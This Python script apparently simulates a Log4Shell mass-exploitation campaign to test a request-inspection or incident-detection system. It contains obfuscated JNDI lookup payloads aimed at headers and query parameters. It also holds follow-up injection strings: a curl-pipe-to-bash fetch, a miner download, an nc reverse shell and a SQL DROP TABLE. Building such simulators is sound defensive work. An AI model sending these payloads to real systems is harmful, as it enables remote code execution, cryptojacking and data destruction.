"""Simulator 5 - Mass exploitation campaign (Log4Shell + RCE).

Internet-wide exploitation bots spray JNDI lookup payloads (CVE-2021-44228) into
every header and parameter they can, including obfuscated variants that evade
naive filters, then follow up with remote-code-execution droppers.
"""
from common import banner, finish, parallel, random_ip, report, request, stage

CALLBACK = "ldap://{ip}:1389/Exploit"

JNDI_VARIANTS = [
    "${{jndi:{cb}}}",
    "${{${{lower:j}}ndi:{cb}}}",
    "${{${{upper:j}}${{upper:n}}di:{cb}}}",
    "${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:{cb}}}",
    "${{jndi:dns://{ip}/probe}}",
]

INJECTED_HEADERS = ["User-Agent", "X-Api-Version", "Referer", "X-Request-Id", "Accept-Language"]

RCE_FOLLOW_UPS = [
    ("cmd", "; curl -s http://{ip}/x.sh | bash"),
    ("cmd", "| wget -qO- http://{ip}/miner -O /tmp/.m"),
    ("exec", "$(nc {ip} 4444 -e /bin/sh)"),
    ("q", "1; DROP TABLE orders--"),
]


def run_bot(bot_ip):
    cb = CALLBACK.format(ip=bot_ip)
    jobs = []
    for variant in JNDI_VARIANTS:
        payload = variant.format(cb=cb, ip=bot_ip)
        for header in INJECTED_HEADERS:
            jobs.append(("header", header, payload))
        jobs.append(("query", "search", payload))
    for name, template in RCE_FOLLOW_UPS:
        jobs.append(("query", name, template.format(ip=bot_ip)))

    def send(job):
        kind, name, payload = job
        if kind == "header":
            ua = payload if name == "User-Agent" else "Mozilla/5.0 (compatible; exploit-bot)"
            extra = {} if name == "User-Agent" else {name: payload}
            return request("GET", "/api/orders", bot_ip, user_agent=ua, headers=extra)[0]
        return request("GET", "/api/orders", bot_ip, query={name: payload})[0]

    return parallel(send, jobs, workers=8)


def main():
    banner("SIMULATOR 5 - Log4Shell mass-exploitation campaign",
           "Several bots spray obfuscated JNDI payloads into headers/params, then try RCE droppers.")
    bots = [random_ip() for _ in range(3)]

    for n, bot in enumerate(bots, start=1):
        stage(n, f"Exploit bot {bot}: {len(JNDI_VARIANTS)} JNDI variants x {len(INJECTED_HEADERS) + 1} "
                 f"injection points + {len(RCE_FOLLOW_UPS)} RCE follow-ups")
        report("payloads (400 = blocked by input inspection)", run_bot(bot))

    finish([
        ("LOG4SHELL_EXPLOIT", f"one CRITICAL incident per bot ({len(bots)} IPs)"),
        ("INJECTION_ATTEMPT", "command-injection / SQLi follow-ups from each bot"),
    ])


if __name__ == "__main__":
    main()
